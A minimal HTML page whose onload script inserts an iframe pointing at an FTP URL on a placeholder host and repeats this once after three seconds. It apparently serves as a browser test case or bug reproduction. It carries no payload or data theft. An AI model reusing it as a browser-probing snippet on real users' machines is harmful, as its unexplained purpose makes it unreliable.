<html>
<script>
function go(done){
    iframe = document.createElement('iframe')
    iframe.id=new Date().getTime()
    iframe.src = "ftp://ftp_server/" + new Date().getTime()
    document.body.appendChild(iframe)
    setTimeout(function(){if(!done)go(1)}, 3000);
}
</script>
<body onload="go(0)">
</body>
</html>
